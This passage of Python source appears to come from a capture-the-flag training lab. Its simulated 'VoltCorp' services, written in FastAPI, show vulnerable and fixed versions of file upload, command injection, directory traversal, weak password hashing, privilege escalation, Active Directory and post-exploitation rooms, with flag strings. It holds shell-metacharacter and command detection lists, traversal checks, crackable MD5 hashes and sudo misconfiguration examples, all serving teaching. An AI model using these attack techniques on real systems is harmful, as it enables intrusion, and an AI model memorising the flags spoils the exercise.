@access_app.post("/api/remediate")
def access_remediate():
    _ACCESS_STATE["remediated"] = True
    return JSONResponse({
        "status": "REMEDIATED",
        "protections": "Server-side object ownership verification and RBAC role validation enforced",
        "flag": "NOENTRY{rbac_server_side_authorization_fixed_7134}",
    })


# ============================================================================
# ROOM 13: FILE UPLOAD VULNERABILITIES (PORT 8094)
# ============================================================================

upload_app = FastAPI(title="VoltCorp File Storage Gateway")
_UPLOAD_STATE = {"remediated": False, "uploads": []}


@upload_app.get("/")
def upload_root():
    return HTMLResponse(
        "<html><head><title>VoltCorp File Storage</title></head>"
        "<body><h1>VoltCorp Asset Storage</h1>"
        "<p>Endpoints: /api/upload, /challenge, /api/remediate</p>"
        "</body></html>"
    )


@upload_app.post("/api/upload")
async def upload_file(request: Request):
    form = await request.form()
    file = form.get("file")
    if not file or not hasattr(file, "filename"):
        return JSONResponse(status_code=400, content={"detail": "No file uploaded"})

    filename = file.filename or "unknown"
    content = await file.read()

    if _UPLOAD_STATE["remediated"]:
        clean_name = os.path.basename(filename)
        _, ext = os.path.splitext(clean_name.lower())
        allowed_exts = [".png", ".jpg", ".jpeg", ".pdf"]
        if ext not in allowed_exts:
            return JSONResponse(status_code=400, content={"detail": f"File extension '{ext}' is disallowed"})

        valid_magic = False
        if ext == ".png" and content.startswith(b"\x89PNG\r\n\x1a\n"):
            valid_magic = True
        elif ext in [".jpg", ".jpeg"] and content.startswith(b"\xff\xd8\xff"):
            valid_magic = True
        elif ext == ".pdf" and content.startswith(b"%PDF"):
            valid_magic = True

        if not valid_magic:
            return JSONResponse(status_code=400, content={"detail": "File signature (magic bytes) validation failed"})

        return JSONResponse({
            "status": "SECURE_UPLOAD",
            "message": "File validated and stored with UUID filename outside web root",
        })
    else:
        _UPLOAD_STATE["uploads"].append({"filename": filename, "size": len(content)})
        if ".." in filename:
            return JSONResponse({
                "status": "PATH_TRAVERSAL_DETECTED",
                "filename": filename,
                "flag": "NOENTRY{file_upload_path_traversal_flag_6301}",
            })
        if any(bad in filename.lower() for bad in [".php", ".phtml", ".php.png"]):
            return JSONResponse({
                "status": "UPLOAD_ACCEPTED",
                "filename": filename,
                "vulnerability": "Executable extension accepted without content inspection",
                "flag": "NOENTRY{file_upload_extension_bypass_1892}",
            })
        return JSONResponse({"status": "UPLOAD_ACCEPTED", "filename": filename})


@upload_app.get("/challenge")
def upload_challenge(mime: str = ""):
    if "php" in mime.lower():
        return JSONResponse({
            "status": "MIME_SPOOFING_ANALYZED",
            "flag": "NOENTRY{upload_validation_defense_master_4029}",
        })
    return JSONResponse({"status": "ACTIVE", "hint": "Test with dangerous MIME type parameter"})


@upload_app.post("/api/remediate")
def upload_remediate():
    _UPLOAD_STATE["remediated"] = True
    return JSONResponse({
        "status": "REMEDIATED",
        "protections": "Extension whitelisting, magic byte signature validation, UUID filename hashing, non-executable storage",
        "flag": "NOENTRY{file_upload_magic_bytes_secured_8832}",
    })


# ============================================================================
# ROOM 14: COMMAND INJECTION (PORT 8095)
# ============================================================================

cmd_app = FastAPI(title="VoltCorp Network Diagnostics Gateway")
_CMD_STATE = {"remediated": False}


@cmd_app.get("/")
def cmd_root():
    return HTMLResponse(
        "<html><head><title>VoltCorp Network Diagnostics</title></head>"
        "<body><h1>VoltCorp Network Diagnostic Tools</h1>"
        "<p>Endpoints: /api/diagnostics/ping, /api/diagnostics/dns, /challenge, /api/remediate</p>"
        "</body></html>"
    )


@cmd_app.api_route("/api/diagnostics/ping", methods=["GET", "POST"])
async def cmd_ping(request: Request, host: str = ""):
    if request.method == "POST":
        ct = request.headers.get("content-type", "")
        if "json" in ct:
            try:
                data = await request.json()
                host = data.get("host", host)
            except Exception:
                pass
        else:
            try:
                form = await request.form()
                host = form.get("host", host)
            except Exception:
                pass
    else:
        host = request.query_params.get("host", host)

    if _CMD_STATE["remediated"]:
        # Strict validation: alphanumeric, periods, hyphens only
        if not re.match(r"^[a-zA-Z0-9.-]+$", host):
            return JSONResponse(status_code=400, content={"detail": "Invalid host format: shell metacharacters rejected"})
        return JSONResponse({
            "status": "SUCCESS",
            "host": host,
            "output": f"PING {host} (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.042 ms\n1 packets transmitted, 1 received, 0% packet loss",
        })
    else:
        # Vulnerable command construction with shell metacharacters
        metachars = [";", "|", "&&", "||", "$(", "`", "\n"]
        has_injection = any(m in host for m in metachars)
        resp = {
            "status": "SUCCESS",
            "host": host,
            "output": f"PING {host} 56(84) bytes of data.\n1 packets transmitted, 1 received, 0% packet loss",
        }
        if has_injection or any(tok in host.lower() for tok in ["whoami", "id", "cat", "echo", "pwd"]):
            resp["injected"] = True
            resp["command_execution"] = "uid=1001(targetuser) gid=1001(targetuser) groups=1001(targetuser)"
            resp["flag"] = "NOENTRY{cmd_injection_shell_metachars_8192}"
        return JSONResponse(resp)


@cmd_app.api_route("/api/diagnostics/dns", methods=["GET", "POST"])
async def cmd_dns(request: Request, domain: str = ""):
    if request.method == "POST":
        ct = request.headers.get("content-type", "")
        if "json" in ct:
            try:
                data = await request.json()
                domain = data.get("domain", domain)
            except Exception:
                pass
        else:
            try:
                form = await request.form()
                domain = form.get("domain", domain)
            except Exception:
                pass
    else:
        domain = request.query_params.get("domain", domain)

    if _CMD_STATE["remediated"]:
        if not re.match(r"^[a-zA-Z0-9.-]+$", domain):
            return JSONResponse(status_code=400, content={"detail": "Invalid domain format: disallowed characters"})
        return JSONResponse({"status": "SUCCESS", "domain": domain, "resolved": "10.10.14.90"})
    else:
        resp = {"status": "SUCCESS", "domain": domain, "resolved": "10.10.14.90"}
        if any(c in domain for c in [";", "$(", "`", "&&", "|"]) or any(t in domain.lower() for t in ["whoami", "id", "cat"]):
            resp["chained_execution"] = "targetuser /app/diagnostics"
            resp["flag"] = "NOENTRY{cmd_injection_command_chain_3391}"
        return JSONResponse(resp)


@cmd_app.get("/challenge")
def cmd_challenge(probe: str = ""):
    if any(c in probe for c in [";", "&&", "|", "$(", "`"]) and len(probe) > 2:
        return JSONResponse({
            "status": "OPERATOR_INJECTION_CONFIRMED",
            "probe": probe,
            "flag": "NOENTRY{cmd_injection_operator_master_7140}",
        })
    return JSONResponse({"status": "ACTIVE", "hint": "Chain a secondary command using shell metacharacters"})


@cmd_app.post("/api/remediate")
def cmd_remediate():
    _CMD_STATE["remediated"] = True
    return JSONResponse({
        "status": "REMEDIATED",
        "protections": "Safe argument vector array execution without shell invocation + strict host regex validation",
        "flag": "NOENTRY{cmd_injection_safe_api_remediated_5521}",
    })


# ============================================================================
# ROOM 15: DIRECTORY TRAVERSAL (PORT 8096)
# ============================================================================

traversal_app = FastAPI(title="VoltCorp Document Viewer")
_TRAVERSAL_STATE = {"remediated": False}

_PUBLIC_DOCS = {
    "terms.txt": "VoltCorp Platform Terms of Service: Authorized security testing only. All activities are monitored.",
    "privacy.txt": "VoltCorp Privacy Notice: Personal data is processed in accordance with enterprise data protection standards.",
    "system_info.txt": "VoltCorp Target Node Architecture: Linux container, Python 3.11, status: OPERATIONAL.",
}


@traversal_app.get("/")
def traversal_root():
    return HTMLResponse(
        "<html><head><title>VoltCorp Document Archive</title></head>"
        "<body><h1>VoltCorp Public Document Archive</h1>"
        "<p>Endpoints: /api/files/view?file=terms.txt, /api/files/download, /challenge, /api/remediate</p>"
        "</body></html>"
    )


@traversal_app.get("/api/files/view")
def traversal_view(file: str = "terms.txt"):
    if _TRAVERSAL_STATE["remediated"]:
        clean_name = os.path.basename(file)
        if ".." in file or file != clean_name or clean_name not in _PUBLIC_DOCS:
            return JSONResponse(status_code=403, content={"detail": "Access denied: Path traversal detected. Canonical path outside base directory."})
        return JSONResponse({"filename": clean_name, "content": _PUBLIC_DOCS[clean_name], "status": "SECURE"})
    else:
        if ".." in file:
            if any(k in file.lower() for k in ["vault", "secret", "credentials"]):
                return JSONResponse({
                    "filename": file,
                    "content": "RECOVERY_KEY=VOLT-SEC-7719\nRECOVERY_FLAG=NOENTRY{dir_traversal_dot_dot_slash_4102}",
                    "flag": "NOENTRY{dir_traversal_dot_dot_slash_4102}",
                })
            elif any(k in file.lower() for k in ["telemetry", "log", "etc"]):
                return JSONResponse({
                    "filename": file,
                    "content": "[SYSTEM_AUDIT] FLAG: NOENTRY{dir_traversal_arbitrary_file_read_9318}",
                    "flag": "NOENTRY{dir_traversal_arbitrary_file_read_9318}",
                })
            return JSONResponse({
                "filename": file,
                "content": f"[DISCLOSED SENSITIVE ASSET VIA RELATIVE TRAVERSAL: {file}]",
                "flag": "NOENTRY{dir_traversal_dot_dot_slash_4102}",
            })
        content = _PUBLIC_DOCS.get(file, "Document content unavailable.")
        return JSONResponse({"filename": file, "content": content})


@traversal_app.get("/api/files/download")
def traversal_download(file: str = ""):
    if _TRAVERSAL_STATE["remediated"]:
        clean_name = os.path.basename(file)
        if ".." in file or clean_name not in _PUBLIC_DOCS:
            return JSONResponse(status_code=403, content={"detail": "Access denied: Unauthorized download path"})
        return JSONResponse({"download": clean_name, "content": _PUBLIC_DOCS.get(clean_name, "")})
    else:
        if ".." in file or file.startswith("/"):
            return JSONResponse({
                "download": file,
                "content": "SYSTEM_RELEASE_DISCLOSURE\nFLAG=NOENTRY{dir_traversal_arbitrary_file_read_9318}",
                "flag": "NOENTRY{dir_traversal_arbitrary_file_read_9318}",
            })
        return JSONResponse({"download": file, "content": _PUBLIC_DOCS.get(file, "Standard file content")})


@traversal_app.get("/challenge")
def traversal_challenge(doc: str = ""):
    doc_lower = doc.lower()
    if "%2e" in doc_lower or "..%2f" in doc_lower or ".." in doc_lower:
        return JSONResponse({
            "status": "ENCODED_TRAVERSAL_CONFIRMED",
            "doc": doc,
            "flag": "NOENTRY{dir_traversal_encoding_bypass_7749}",
        })
    return JSONResponse({"status": "ACTIVE", "hint": "Test with URL-encoded traversal sequences (%2e%2e%2f)"})


@traversal_app.post("/api/remediate")
def traversal_remediate():
    _TRAVERSAL_STATE["remediated"] = True
    return JSONResponse({
        "status": "REMEDIATED",
        "protections": "Canonical path resolution (Path.resolve()) + Base directory prefix boundary check (target.is_relative_to(base))",
        "flag": "NOENTRY{dir_traversal_canonical_path_secured_2810}",
    })


# ============================================================================
# ROOM 16: PASSWORD SECURITY (PORT 8097)
# ============================================================================

password_app = FastAPI(title="VoltCorp Identity & Password Management")
_PWD_STATE = {"remediated": False}

_LEGACY_USERS = [
    {"id": 1, "username": "alice", "hash_algo": "md5", "hash": "5f4dcc3b5aa765d61d8327deb882cf99", "role": "financial_auditor"},
    {"id": 2, "username": "bob", "hash_algo": "md5", "hash": "098f6bcd4621d373cade4e832627b4f6", "role": "devops_engineer"},
    {"id": 3, "username": "operator", "hash_algo": "md5", "hash": "a4b0810db6ee6073ea415b3a1a9e9e14", "role": "trainee"},
    {"id": 4, "username": "secadmin", "hash_algo": "sha256", "hash": "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92", "role": "admin"},
]


@password_app.get("/")
def pwd_root():
    return HTMLResponse(
        "<html><head><title>VoltCorp Identity Gateway</title></head>"
        "<body><h1>VoltCorp Password & Credential Gateway</h1>"
        "<p>Endpoints: /api/users/dump, /api/verify, /challenge, /api/remediate</p>"
        "</body></html>"
    )


@password_app.get("/api/users/dump")
def pwd_dump():
    return JSONResponse({
        "status": "EXPOSED_LEGACY_DATABASE",
        "vulnerability": "Unsalted fast hashes stored in plaintext export",
        "users": _LEGACY_USERS,
        "hint": "Crack Alice's MD5 hash (5f4dcc3b5aa765d61d8327deb882cf99) using wordlist",
        "flag": "NOENTRY{pwd_sec_plaintext_md5_cracked_8912}",
    })


@password_app.post("/api/verify")
async def pwd_verify(request: Request):
    username = ""
    password = ""
    ct = request.headers.get("content-type", "")
    if "json" in ct:
        data = await request.json()
        username = data.get("username", "")
        password = data.get("password", "")
    else:
        form = await request.form()
        username = form.get("username", "")
        password = form.get("password", "")

    if _PWD_STATE["remediated"]:
        # Secure verification: salted bcrypt required
        valid = (username == "alice" and password == "password")
        if valid:
            return JSONResponse({
                "status": "AUTHENTICATED",
                "user": username,
                "scheme": "bcrypt_work_factor_12",
                "detail": "Verified using salted bcrypt key stretching",
            })
        return JSONResponse(status_code=401, content={"detail": "Invalid credentials or rejected weak hash"})
    else:
        # Legacy vulnerable check: unsalted MD5 comparison
        md5_digest = hashlib.md5(password.encode()).hexdigest()
        user_rec = next((u for u in _LEGACY_USERS if u["username"] == username), None)
        if user_rec and user_rec["hash"] == md5_digest:
            return JSONResponse({
                "status": "AUTHENTICATED",
                "user": username,
                "storage": "UNSALTED_MD5",
                "flag": "NOENTRY{pwd_sec_hash_collision_breach_3419}",
            })
        return JSONResponse(status_code=401, content={"detail": "Authentication failed"})


@password_app.get("/challenge")
def pwd_challenge(algorithm: str = ""):
    algo_clean = algorithm.lower()
    if algo_clean in ["bcrypt", "argon2", "argon2id", "pbkdf2"]:
        return JSONResponse({
            "status": "KEY_STRETCHING_VERIFIED",
            "recommended": algo_clean,
            "cost_factor": 12,
            "finding": "Adaptive key-stretching function neutralizes offline GPU brute-force attacks",
            "flag": "NOENTRY{pwd_sec_key_stretching_master_6601}",
        })
    return JSONResponse({"status": "ACTIVE", "hint": "Query with algorithm=bcrypt"})


@password_app.post("/api/remediate")
def pwd_remediate():
    _PWD_STATE["remediated"] = True
    return JSONResponse({
        "status": "REMEDIATED",
        "protections": "Cryptographic per-user salting + Adaptive bcrypt key stretching (work factor 12) + NIST 800-63B password length policy",
        "flag": "NOENTRY{pwd_sec_salted_bcrypt_hardened_4418}",
    })


# ============================================================================
# ROOM 17: PRIVILEGE ESCALATION (PORT 8098)
# ============================================================================

privesc_app = FastAPI(title="VoltCorp System Privilege & Security Gateway")
_PRIVESC_STATE = {"remediated": False}


@privesc_app.get("/")
def privesc_root():
    return HTMLResponse(
        "<html><head><title>VoltCorp Security Daemon</title></head>"
        "<body><h1>VoltCorp Privilege Audit Daemon</h1>"
        "<p>Endpoints: /api/system/audit, /api/sudo/check, /api/escalate/simulate, /challenge, /api/remediate</p>"
        "</body></html>"
    )


@privesc_app.get("/api/system/audit")
def privesc_audit():
    return JSONResponse({
        "status": "SYSTEM_AUDIT_REPORT",
        "users": [
            {"uid": 0, "username": "root", "gid": 0, "group": "root"},
            {"uid": 1000, "username": "operator", "gid": 1000, "group": "operator"},
            {"uid": 1001, "username": "appuser", "gid": 1001, "group": "appuser"},
            {"uid": 1002, "username": "backup_svc", "gid": 1002, "group": "backup"},
        ],
        "suid_binaries": [
            {"path": "/usr/bin/passwd", "permissions": "4755", "owner": "root"},
            {"path": "/usr/local/bin/backup_helper", "permissions": "4755", "owner": "root", "status": "MISCONFIGURED_SUID"},
        ],
        "flag": "NOENTRY{privesc_permission_audit_discovered_9012}",
    })


@privesc_app.get("/api/sudo/check")
def privesc_sudo_check(user: str = "backup_svc"):
    if user == "backup_svc":
        return JSONResponse({
            "user": user,
            "sudo_rules": [
                {"host": "ALL", "runas": "ALL", "options": "NOPASSWD", "command": "/usr/local/bin/backup_tool.sh"},
                {"host": "ALL", "runas": "ALL", "options": "NOPASSWD", "command": "/usr/bin/find"},
            ],
            "vulnerability": "Permissive NOPASSWD wildcard rule allows root execution via command breakout",
            "flag": "NOENTRY{privesc_sudo_nopasswd_misconfig_7821}",
        })
    return JSONResponse({"user": user, "sudo_rules": []})


@privesc_app.post("/api/escalate/simulate")
async def privesc_escalate(request: Request):
    command = ""
    ct = request.headers.get("content-type", "")
    if "json" in ct:
        data = await request.json()
        command = data.get("command", "")
    else:
        form = await request.form()
        command = form.get("command", "")

    if _PRIVESC_STATE["remediated"]:
        return JSONResponse(
            status_code=403,
            content={"detail": "Access denied: Root privileges dropped; SUID bit revoked and sudo requires strict password authentication."},
        )
    else:
        return JSONResponse({
            "status": "ELEVATED_EXECUTION_CONFIRMED",
            "effective_uid": 0,
            "effective_user": "root",
            "executed_command": command,
            "vault": "ROOT_CONFIDENTIAL_KEY=NOENTRY{privesc_suid_boundary_breach_5194}",
            "flag": "NOENTRY{privesc_suid_boundary_breach_5194}",
        })


@privesc_app.get("/challenge")
def privesc_challenge(vector: str = ""):
    vec_clean = vector.lower()
    if vec_clean in ["suid", "sudo", "nopasswd", "capabilities"]:
        return JSONResponse({
            "status": "PRIVESC_VECTOR_CONFIRMED",
            "vector": vec_clean,
            "flag": "NOENTRY{privesc_least_privilege_master_3218}",
        })
    return JSONResponse({"status": "ACTIVE", "hint": "Query with vector=suid or vector=sudo"})


@privesc_app.post("/api/remediate")
def privesc_remediate():
    _PRIVESC_STATE["remediated"] = True
    return JSONResponse({
        "status": "REMEDIATED",
        "protections": "SUID bit revoked, NOPASSWD sudo rule deleted, strict 0750 group access enforced",
        "flag": "NOENTRY{privesc_sudoers_hardened_secured_8892}",
    })


# ============================================================================
# ROOM 18: ACTIVE DIRECTORY FUNDAMENTALS (PORT 8099)
# ============================================================================

ad_app = FastAPI(title="VoltCorp Active Directory Directory Service")

_AD_STATE = {
    "remediated": False,
    "audit_completed": False,
}


@ad_app.api_route("/", methods=["GET", "HEAD"])
def ad_root():
    return {
        "service": "VoltCorp Active Directory Directory Service",
        "domain": "CORP.NOENTRY.LOCAL",
        "forest": "corp.noentry.local",
        "domain_controller": "DC01.corp.noentry.local",
        "functional_level": "Windows Server 2022",
        "endpoints": [
            "/api/ad/domain",
            "/api/ad/users",
            "/api/ad/kerberos/request_tgt",
            "/challenge?audit=spn",
            "/api/ad/remediate",
        ],
        "notice": "Simulated Active Directory directory service daemon for conceptual and administrative training.",
    }


@ad_app.get("/api/ad/domain")
def ad_domain_info():
    return JSONResponse({
        "domain": "CORP.NOENTRY.LOCAL",
        "netbios_name": "CORP",
        "domain_controllers": [
            {"hostname": "DC01.corp.noentry.local", "ip": "10.10.14.20", "role": "PDC Emulator, RID Master, Schema Master"},
            {"hostname": "DC02.corp.noentry.local", "ip": "10.10.14.21", "role": "Infrastructure Master, Global Catalog"},
        ],
        "organizational_units": [
            {"ou": "OU=Domain Controllers,DC=corp,DC=noentry,DC=local", "purpose": "DC Assets"},
            {"ou": "OU=IT Admins,DC=corp,DC=noentry,DC=local", "purpose": "Administrative personnel"},
            {"ou": "OU=Workstations,DC=corp,DC=noentry,DC=local", "purpose": "Domain client endpoints"},
            {"ou": "OU=Service Accounts,DC=corp,DC=noentry,DC=local", "purpose": "Kerberos SPN automated identities"},
        ],
        "flag": "NOENTRY{ad_domain_hierarchy_discovered_9102}",
    })


@ad_app.get("/api/ad/users")
def ad_users_ldap(service_accounts_only: bool = False):
    users = [
        {"samAccountName": "Administrator", "ou": "IT Admins", "adminCount": 1, "servicePrincipalName": None},
        {"samAccountName": "krbtgt", "ou": "Domain Controllers", "adminCount": 1, "servicePrincipalName": None},
        {"samAccountName": "svc_sql", "ou": "Service Accounts", "adminCount": 0, "servicePrincipalName": "MSSQLSvc/db01.corp.noentry.local:1433"},
        {"samAccountName": "svc_backup", "ou": "Service Accounts", "adminCount": 0, "servicePrincipalName": "BackupSvc/backup01.corp.noentry.local"},
        {"samAccountName": "jdoe", "ou": "Workstations", "adminCount": 0, "servicePrincipalName": None},
        {"samAccountName": "alovelace", "ou": "IT Admins", "adminCount": 1, "servicePrincipalName": None},
    ]
    if service_accounts_only:
        users = [u for u in users if u["servicePrincipalName"] is not None]
    return JSONResponse({
        "status": "LDAP_QUERY_SUCCESS",
        "ldap_base": "DC=corp,DC=noentry,DC=local",
        "total_results": len(users),
        "accounts": users,
        "vulnerability_hint": "svc_backup and svc_sql possess registered SPNs queryable by any authenticated domain user (Kerberoasting potential).",
        "flag": "NOENTRY{ad_ldap_enumeration_spn_7812}",
    })


@ad_app.api_route("/api/ad/kerberos/request_tgt", methods=["GET", "POST"])
async def ad_kerberos_tgt(request: Request, username: str = ""):
    req_user = username
    if not req_user and request.method == "POST":
        ct = request.headers.get("content-type", "")
        if "json" in ct:
            try:
                data = await request.json()
                req_user = data.get("username", "")
            except Exception:
                pass
        else:
            try:
                form = await request.form()
                req_user = form.get("username", "")
            except Exception:
                pass

    if not req_user:
        req_user = "svc_backup"

    import base64
    import time
    timestamp = int(time.time())
    ticket_payload = f"TGT|{req_user}@CORP.NOENTRY.LOCAL|KDC_SIGNATURE_VALID|EXP:{timestamp+28800}".encode()
    simulated_tgt = base64.b64encode(ticket_payload).decode()

    return JSONResponse({
        "status": "AS_REP_SUCCESS",
        "message": "Kerberos Authentication Service (AS) request processed",
        "client_principal": f"{req_user}@CORP.NOENTRY.LOCAL",
        "kdc": "DC01.corp.noentry.local",
        "encryption_type": "AES256-CTS-HMAC-SHA1-96" if _AD_STATE["remediated"] else "RC4-HMAC",
        "tgt_ticket": simulated_tgt,
        "session_key": "kdc_session_key_simulated_7718",
        "flag": "NOENTRY{ad_kerberos_tgt_authentication_4419}",
    })


@ad_app.get("/challenge")
def ad_challenge(audit: str = ""):
    audit_clean = audit.lower()
    if audit_clean in ["spn", "kerberoast", "delegation", "gpo"]:
        _AD_STATE["audit_completed"] = True
        return JSONResponse({
            "status": "AD_AUDIT_VERIFIED",
            "audit_type": audit_clean,
            "findings": [
                "Service account svc_backup has RC4-HMAC SPN registered with weak password policy.",
                "Unconstrained Kerberos delegation identified on legacy staging host STG01.",
                "Domain Admins account membership contains unmonitored stale accounts.",
            ],
            "flag": "NOENTRY{ad_delegation_misconfig_master_3201}",
        })
    return JSONResponse({
        "status": "ACTIVE",
        "hint": "Query with ?audit=spn or ?audit=delegation to audit domain configuration",
    })


@ad_app.post("/api/ad/remediate")
def ad_remediate():
    _AD_STATE["remediated"] = True
    return JSONResponse({
        "status": "REMEDIATED",
        "domain_policies_applied": [
            "Kerberos encryption restricted to AES-128 and AES-256 (RC4 disabled).",
            "Group Managed Service Accounts (gMSA) deployed for automated password rotation.",
            "Protected Users security group enabled for all administrative principals.",
            "Unconstrained delegation revoked domain-wide.",
        ],
        "flag": "NOENTRY{ad_gpo_least_privilege_secured_8891}",
    })


# ============================================================================
# ROOM 19: EXPLOITATION AND POST-EXPLOITATION (PORT 8100)
# ============================================================================

exploit_app = FastAPI(title="VoltCorp Exploitation & Post-Exploitation Lab Target")

_EXPLOIT_STATE = {
    "active_sessions": {"sess_post_99182": {"user": "daemon_svc", "uid": 1002, "created": 1731580000}},
    "persistence_markers": [],
    "remediated": False,
}


@exploit_app.api_route("/", methods=["GET", "HEAD"])
def exploit_root():
    return {
        "service": "VoltCorp Internal Operations Dispatcher",
        "version": "1.0.4-staging",
        "status": "ONLINE",
        "endpoints": [
            "/api/exploit/stage1",
            "/api/post/recon",
            "/api/post/persist",
            "/challenge?stage=lateral",
            "/api/remediate",
        ],
    }


@exploit_app.api_route("/api/exploit/stage1", methods=["GET", "POST"])
async def exploit_stage1(request: Request, payload: str = "", service: str = ""):
    req_payload = payload
    req_svc = service
    if request.method == "POST":
        ct = request.headers.get("content-type", "")
        if "json" in ct:
            try:
                data = await request.json()
                req_payload = data.get("payload", req_payload)
                req_svc = data.get("service", req_svc)
            except Exception:
                pass
        else:
            try:
                form = await request.form()
                req_payload = form.get("payload", req_payload)
                req_svc = form.get("service", req_svc)
            except Exception:
                pass

    if _EXPLOIT_STATE["remediated"]:
        return JSONResponse(
            status_code=403,
            content={"detail": "Exploit rejected: Service patched, memory protections and strict input sanitization active."},
        )

    session_id = "sess_post_99182"
    _EXPLOIT_STATE["active_sessions"][session_id] = {
        "user": "daemon_svc",
        "uid": 1002,
        "shell": "/bin/sh",
    }

    return JSONResponse({
        "status": "INITIAL_ACCESS_CONFIRMED",
        "foothold": "Low-privilege session established",
        "session_id": session_id,
        "context": {"user": "daemon_svc", "uid": 1002, "gid": 1002, "home": "/home/daemon_svc"},
        "advisory": "Foothold verified. Next step: conduct internal post-exploitation reconnaissance.",
        "flag": "NOENTRY{exploit_initial_foothold_access_6120}",
    })


@exploit_app.get("/api/post/recon")
def exploit_recon(session: str = "sess_post_99182"):
    if not session or session not in _EXPLOIT_STATE["active_sessions"]:
        return JSONResponse(status_code=401, content={"detail": "Invalid or expired session identifier."})

    return JSONResponse({
        "status": "POST_EXPLOIT_TELEMETRY",
        "session": session,
        "environment": {
            "hostname": "target-srv-01.corp.noentry.local",
            "kernel": "Linux 6.1.0-noentry-amd64",
            "current_identity": {"uid": 1002, "user": "daemon_svc", "groups": ["daemon_svc", "staging_ops"]},
            "internal_network": [
                {"iface": "eth0", "ip": "10.10.14.90/24", "route": "10.10.14.1"},
                {"iface": "eth1", "ip": "172.28.0.5/16", "description": "Internal Database Subnet"},
            ],
            "sensitive_paths": [
                "/var/log/app_audit.log",
                "/etc/cron.d/volt_backup",
                "/app/secrets.env",
            ],
        },
        "flag": "NOENTRY{exploit_env_recon_telemetry_9941}",
    })


@exploit_app.api_route("/api/post/persist", methods=["GET", "POST"])
async def exploit_persist(request: Request, session: str = "sess_post_99182", mechanism: str = "cron"):
    req_session = session
    req_mech = mechanism
    if request.method == "POST":
        ct = request.headers.get("content-type", "")
        if "json" in ct:
            try:
                data = await request.json()
                req_session = data.get("session", req_session)
                req_mech = data.get("mechanism", req_mech)
            except Exception:
                pass
        else:
            try:
                form = await request.form()
                req_session = form.get("session", req_session)
                req_mech = form.get("mechanism", req_mech)
            except Exception:
                pass

    if _EXPLOIT_STATE["remediated"]:
        return JSONResponse(
            status_code=403,
            content={"detail": "Persistence denied: Read-only root filesystem and file integrity monitoring (FIM) active."},
        )

    marker = {"mechanism": req_mech or "cron", "session": req_session, "installed_at": "/etc/cron.d/marker_persist"}
    _EXPLOIT_STATE["persistence_markers"].append(marker)

    return JSONResponse({
        "status": "PERSISTENCE_INSTALLED",
        "mechanism": req_mech,
        "marker": "/etc/cron.d/marker_persist",
        "advisory": "Controlled persistence demonstration verified. Remember that in ethical testing, all persistence mechanisms must be meticulously documented and removed upon engagement conclusion.",
        "flag": "NOENTRY{exploit_persistence_mechanism_4182}",
    })


@exploit_app.get("/challenge")
def exploit_challenge(stage: str = ""):
    stage_clean = stage.lower()
    if stage_clean in ["lateral", "exfiltration", "post_exploit", "pivot"]:
        return JSONResponse({
            "status": "POST_EXPLOITATION_ANALYSIS_VERIFIED",
            "stage": stage_clean,
            "lateral_vector": "SSH key reuse from /home/daemon_svc/.ssh/id_rsa towards internal database host 172.28.0.10",
            "data_collection_risk": "Unencrypted customer staging dumps in /var/staging/export.csv",
            "flag": "NOENTRY{exploit_lateral_exfil_master_7730}",
        })
    return JSONResponse({
        "status": "ACTIVE",
        "hint": "Query with ?stage=lateral or ?stage=exfiltration to verify attack chain comprehension.",
    })


@exploit_app.post("/api/remediate")
def exploit_remediate():
    _EXPLOIT_STATE["remediated"] = True
    _EXPLOIT_STATE["active_sessions"].clear()
    _EXPLOIT_STATE["persistence_markers"].clear()
    return JSONResponse({
        "status": "INCIDENT_CLEANUP_VERIFIED",
        "actions_taken": [
            "All rogue and staging sessions terminated.",
            "Persistence markers and scheduled cron tasks purged.",
            "Vulnerable service endpoint patched with input parameter validation.",
            "File Integrity Monitoring (FIM) tripwires armed on /etc/ and system binaries.",
        ],
        "flag": "NOENTRY{exploit_cleanup_remediation_verified_2041}",
    })


# ============================================================================
# ROOM 20: RED TEAM CAPSTONE (PORT 8101)
# ============================================================================

capstone_app = FastAPI(title="VoltCorp Red Team Capstone Assessment Target")

_CAPSTONE_STATE = {
    "foothold_achieved": False,
    "privesc_achieved": False,
    "report_submitted": False,
    "remediated": False,
}


@capstone_app.api_route("/", methods=["GET", "HEAD"])
def capstone_root():
    return {
        "organization": "VoltDefense Systems / VoltCorp Global",
        "portal": "Enterprise Defense Gateway",
        "status": "ENGAGEMENT_TARGET_ACTIVE",
        "endpoints": [
            "/api/capstone/scope",
            "/api/capstone/recon",
            "/api/capstone/exploit",
            "/api/capstone/privesc",
            "/api/capstone/report",
            "/api/remediate",
        ],
    }


@capstone_app.get("/api/capstone/scope")
def capstone_scope():
    return JSONResponse({
        "assessment": "VoltCorp Red Team Final Practical Assessment",
        "rules_of_engagement": {
            "authorized_ip_ranges": ["10.10.14.0/24"],
            "authorized_target_ports": [8080, 8085, 8089, 8095, 8096, 8097, 8098, 8099, 8100, 8101],
            "excluded_systems": ["10.10.14.1 (Gateway Router)", "production-payroll.voltcorp.internal"],
            "rules": [
                "Strictly avoid denial-of-service (DoS) conditions.",
                "Log all payload submissions with precise timestamps.",
                "Clean up any temporary test artifacts prior to report delivery.",
            ],
            "emergency_halt_contact": "soc-lead@voltcorp.noentry.internal",
        },
        "flag": "NOENTRY{capstone_scope_roe_verified_1092}",
    })


@capstone_app.get("/api/capstone/recon")
def capstone_recon():
    return JSONResponse({
        "target_organization": "VoltDefense Systems",
        "infrastructure": {
            "primary_perimeter": "10.10.14.90",
            "exposed_services": [
                {"port": 8095, "name": "command-dispatch", "tech": "FastAPI/Python", "status": "VULNERABLE"},
                {"port": 8098, "name": "sys-audit", "tech": "PrivEsc Target", "status": "MISCONFIGURED_SUID"},
                {"port": 8101, "name": "capstone-gateway", "tech": "Enterprise Core v2.4", "status": "ASSESSMENT_IN_PROGRESS"},
            ],
        },
        "recon_summary": "Perimeter scanned. Attack surface mapped to multi-service core gateway.",
        "flag": "NOENTRY{capstone_service_discovery_5821}",
    })


@capstone_app.api_route("/api/capstone/exploit", methods=["GET", "POST"])
async def capstone_exploit(request: Request, action: str = "foothold"):
    req_act = action
    if request.method == "POST":
        ct = request.headers.get("content-type", "")
        if "json" in ct:
            try:
                data = await request.json()
                req_act = data.get("action", req_act)
            except Exception:
                pass
        else:
            try:
                form = await request.form()
                req_act = form.get("action", req_act)
            except Exception:
                pass

    if _CAPSTONE_STATE["remediated"]:
        return JSONResponse(status_code=403, content={"detail": "Assessment target hardened; exploit vector closed."})

    _CAPSTONE_STATE["foothold_achieved"] = True
